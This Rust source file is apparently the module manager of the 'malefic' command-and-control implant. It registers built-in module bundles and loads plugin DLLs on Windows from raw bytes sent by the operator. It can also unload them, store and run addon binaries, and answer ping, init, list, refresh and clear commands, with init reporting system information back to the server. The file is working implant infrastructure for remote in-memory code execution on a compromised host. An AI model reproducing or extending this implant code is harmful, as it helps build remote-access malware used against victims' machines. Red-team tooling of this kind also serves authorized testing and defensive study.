use std::collections::HashMap;
use std::str::FromStr;

#[cfg(feature = "addon")]
use crate::addons::{AddonMap, MaleficAddon};
use crate::internal::InternalModule;
use malefic_common::check_body;
use malefic_common::errors::MaleficError;
use malefic_module::prelude::*;
use malefic_proto::new_spite;
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::implantpb::{self, Spite};
use malefic_proto::proto::modulepb;
#[cfg(feature = "addon")]
use malefic_proto::proto::modulepb::Addon;

/// Legacy module registration function type (same-compiler only, used by built-in modules).
#[allow(improper_ctypes_definitions)]
pub type ModuleRegister = extern "C" fn() -> MaleficBundle;

pub struct MaleficManager {
    /// Built-in module bundles (statically linked, same compiler).
    bundles: HashMap<String, ModuleRegister>,
    pub(crate) modules: Box<MaleficBundle>,
    /// Plugin DLL loader (owns PE handles for unload).
    #[cfg(all(feature = "hot_load", target_os = "windows"))]
    plugin_loader: malefic_runtime::host::PluginLoader,
    #[cfg(feature = "addon")]
    addons: AddonMap,
}

impl MaleficManager {
    pub fn new() -> Self {
        MaleficManager {
            bundles: HashMap::new(),
            modules: Box::new(HashMap::new()),
            #[cfg(all(feature = "hot_load", target_os = "windows"))]
            plugin_loader: malefic_runtime::host::PluginLoader::new(),
            #[cfg(feature = "addon")]
            addons: AddonMap::new(),
        }
    }

    pub fn clean(&mut self) -> Result<(), MaleficError> {
        #[cfg(feature = "addon")]
        let _ = self.refresh_addon()?;
        let _ = self.refresh_module()?;
        Ok(())
    }

    /// Register a built-in module bundle (statically linked, same compiler).
    pub fn register_bundle(
        &mut self,
        name: impl Into<String>,
        bundle: ModuleRegister,
    ) -> Option<ModuleRegister> {
        self.bundles.insert(name.into(), bundle)
    }

    pub fn unregister_bundle(&mut self, name: &str) -> Option<ModuleRegister> {
        self.bundles.remove(name)
    }

    pub fn refresh_module(&mut self) -> Result<(), MaleficError> {
        self.reload()
    }

    #[cfg(feature = "addon")]
    pub fn refresh_addon(&mut self) -> Result<(), MaleficError> {
        self.addons.clear();
        Ok(())
    }

    pub fn reload(&mut self) -> Result<(), MaleficError> {
        self.modules.clear();
        for (_name, bundle) in self.bundles.iter() {
            let bundle_modules = bundle();
            debug!("refresh module: {} {:?}", _name, bundle_modules.keys());
            for (module_name, module) in bundle_modules {
                self.modules.insert(
                    module_name.to_string(),
                    malefic_runtime::host::RtBridge::wrap(module),
                );
            }
        }
        Ok(())
    }

    /// Hot-load a module DLL from a Spite<LoadModule> (used by stub/dispatch_internal),
    /// with fallback to legacy register_modules.
    pub fn load_module(&mut self, spite: Spite) -> Result<Vec<String>, MaleficError> {
        #[cfg(all(feature = "hot_load", target_os = "windows"))]
        {
            let module = check_body!(spite, Body::LoadModule)?;
            let bin = check_field!(module.bin)?;
            return self.load_module_from_bytes(bin);
        }
        #[cfg(not(all(feature = "hot_load", target_os = "windows")))]
        {
            let _ = spite;
            Ok(Vec::new())
        }
    }

    /// Hot-load a module DLL from raw bytes via PluginLoader.
    pub fn load_module_from_bytes(&mut self, bin: Vec<u8>) -> Result<Vec<String>, MaleficError> {
        #[cfg(all(feature = "hot_load", target_os = "windows"))]
        {
            let plugin_name = format!("plugin_{}", self.plugin_loader.loaded_plugins().len());
            let bundle = unsafe {
                self.plugin_loader
                    .load(plugin_name.clone(), bin)
                    .map_err(|_| MaleficError::ModuleError)?
            };
            let mut names = Vec::new();
            for (module_name, module) in bundle {
                names.push(module_name.clone());
                self.modules.insert(module_name, module);
            }
            debug!("[+] loaded plugin '{}': {:?}", plugin_name, names);
            Ok(names)
        }
        #[cfg(not(all(feature = "hot_load", target_os = "windows")))]
        {
            let _ = bin;
            Ok(Vec::new())
        }
    }

    /// Unload a previously loaded plugin DLL, removing its modules.
    pub fn unload_plugin(&mut self, name: &str) -> Result<Vec<String>, MaleficError> {
        #[cfg(all(feature = "hot_load", target_os = "windows"))]
        {
            let removed_names = unsafe {
                self.plugin_loader
                    .unload(name)
                    .ok_or(MaleficError::ModuleError)?
            };
            for module_name in &removed_names {
                self.modules.remove(module_name);
            }
            debug!("[+] unloaded plugin '{}': {:?}", name, removed_names);
            Ok(removed_names)
        }
        #[cfg(not(all(feature = "hot_load", target_os = "windows")))]
        {
            let _ = name;
            Ok(Vec::new())
        }
    }

    pub fn list_module(&self, internal: Vec<String>) -> (Vec<String>, HashMap<String, String>) {
        let mut bundle_map = HashMap::new();

        // built-in bundles
        for (bundle_name, bundle_fn) in self.bundles.iter() {
            let bundle_modules = bundle_fn();
            for module_name in bundle_modules.keys() {
                bundle_map.insert(module_name.clone(), bundle_name.clone());
            }
        }

        // hot-loaded plugins
        #[cfg(all(feature = "hot_load", target_os = "windows"))]
        {
            bundle_map.extend(self.plugin_loader.module_plugin_map());
        }

        // internal modules have no bundle
        for name in &internal {
            bundle_map.insert(name.clone(), "builtin".to_string());
        }

        let modules: Vec<String> = self.modules.keys().cloned().chain(internal).collect();
        (modules, bundle_map)
    }

    pub fn get_module(&self, name: &str) -> Option<&Box<MaleficModule>> {
        self.modules.get(name)
    }

    #[cfg(feature = "addon")]
    pub fn get_addon(&mut self, name: &str) -> anyhow::Result<Box<MaleficAddon>> {
        self.addons.get(name)
    }

    #[cfg(feature = "addon")]
    pub fn list_addon(&self) -> Vec<Addon> {
        self.addons
            .iter()
            .map(|(name, module)| Addon {
                name: name.clone(),
                r#type: module.r#type.clone(),
                depend: module.depend.clone(),
            })
            .collect()
    }

    #[cfg(feature = "addon")]
    pub fn load_addon(&mut self, spite: Spite) -> Result<(), MaleficError> {
        let ext = check_body!(spite, Body::LoadAddon)?;
        let addon = MaleficAddon {
            name: check_field!(ext.name)?,
            r#type: ext.r#type,
            depend: check_field!(ext.depend)?,
            content: check_field!(ext.bin)?,
        };
        self.addons.insert(addon)?;
        Ok(())
    }

    #[cfg(feature = "addon")]
    pub fn execute_addon(&mut self, spite: Spite) -> Result<Spite, MaleficError> {
        let ext = check_body!(spite, Body::ExecuteAddon)?;
        let addon_name = check_field!(ext.addon)?;
        let addon = self.get_addon(&addon_name)?;
        if self.get_module(&addon.depend).is_none() {
            return Err(MaleficError::ModuleNotFound);
        }
        let mut execute_binary = ext.execute_binary.clone().ok_or(MaleficError::MissBody)?;
        execute_binary.bin = addon.content.clone();
        execute_binary.name = addon.name.clone();
        let result = new_spite(
            spite.task_id,
            addon.depend.clone(),
            Body::ExecuteBinary(execute_binary),
        );
        Ok(result)
    }

    // ── Internal module dispatch ───────────────────────────────────────────

    /// Try to handle a Spite as an internal module.
    ///
    /// Returns:
    /// - `Ok(Some(spite))` — internal module handled, response ready
    /// - `Ok(None)` — not an internal module, caller should dispatch to external module
    /// - `Err(BeaconOnly(_))` — beacon-only internal module, caller handles
    /// - `Err(other)` — processing error
    ///
    /// `register_info` is an optional callback that provides sysinfo + name + timer
    /// for the `init` command. If None, a minimal Register is returned.
    pub fn dispatch_internal(
        &mut self,
        req: &Spite,
        register_info: Option<
            &dyn Fn(&MaleficManager) -> (Option<modulepb::SysInfo>, String, Vec<String>),
        >,
    ) -> Result<Option<Spite>, MaleficError> {
        let name_str = req.name.as_str();
        match InternalModule::from_str(name_str) {
            Ok(InternalModule::Ping) => {
                let ping = check_body!(req, Body::Ping)?;
                Ok(Some(new_spite(
                    req.task_id,
                    InternalModule::Ping.to_string(),
                    Body::Ping(modulepb::Ping { nonce: ping.nonce }),
                )))
            }
            Ok(InternalModule::Init) => {
                let (sysinfo, register_name, addons) = if let Some(info_fn) = register_info {
                    info_fn(self)
                } else {
                    (None, "reactor".to_string(), Vec::new())
                };
                let (modules, _) = self.list_module(InternalModule::all());
                Ok(Some(new_spite(
                    req.task_id,
                    "register".to_string(),
                    Body::Register(modulepb::Register {
                        name: register_name,
                        proxy: String::new(),
                        module: modules,
                        addons: addons
                            .into_iter()
                            .map(|a| modulepb::Addon {
                                name: a,
                                r#type: String::new(),
                                depend: String::new(),
                            })
                            .collect(),
                        sysinfo,
                        timer: None,
                        secure: None,
                    }),
                )))
            }
            Ok(InternalModule::ListModule) => {
                let (modules, bundle_map) = self.list_module(InternalModule::all());
                Ok(Some(new_spite(
                    req.task_id,
                    InternalModule::ListModule.to_string(),
                    Body::Modules(modulepb::Modules {
                        modules,
                        bundle_map,
                    }),
                )))
            }
            Ok(InternalModule::RefreshModule) => {
                self.refresh_module()?;
                let (modules, bundle_map) = self.list_module(InternalModule::all());
                Ok(Some(new_spite(
                    req.task_id,
                    InternalModule::RefreshModule.to_string(),
                    Body::Modules(modulepb::Modules {
                        modules,
                        bundle_map,
                    }),
                )))
            }
            #[cfg(all(feature = "hot_load", target_os = "windows"))]
            Ok(InternalModule::LoadModule) => {
                let modules = self.load_module(req.clone())?;
                Ok(Some(new_spite(
                    req.task_id,
                    InternalModule::LoadModule.to_string(),
                    Body::Modules(modulepb::Modules {
                        modules,
                        bundle_map: HashMap::new(),
                    }),
                )))
            }
            #[cfg(all(feature = "hot_load", target_os = "windows"))]
            Ok(InternalModule::UnloadModule) => {
                let unload_req = check_body!(req.clone(), Body::Request)?;
                let plugin_name = check_field!(unload_req.input)?;
                let _removed = self.unload_plugin(&plugin_name)?;
                // return full module list after unload
                let (modules, bundle_map) = self.list_module(InternalModule::all());
                Ok(Some(new_spite(
                    req.task_id,
                    InternalModule::UnloadModule.to_string(),
                    Body::Modules(modulepb::Modules {
                        modules,
                        bundle_map,
                    }),
                )))
            }
            Ok(InternalModule::Clear) => {
                self.clean()?;
                Ok(Some(new_spite(
                    req.task_id,
                    InternalModule::Clear.to_string(),
                    Body::Empty(implantpb::Empty::default()),
                )))
            }
            // Beacon-only modules — caller handles
            Ok(other) => Err(MaleficError::BeaconOnly(other.to_string())),
            // Not an internal module — fall through to external
            Err(_) => Ok(None),
        }
    }
}
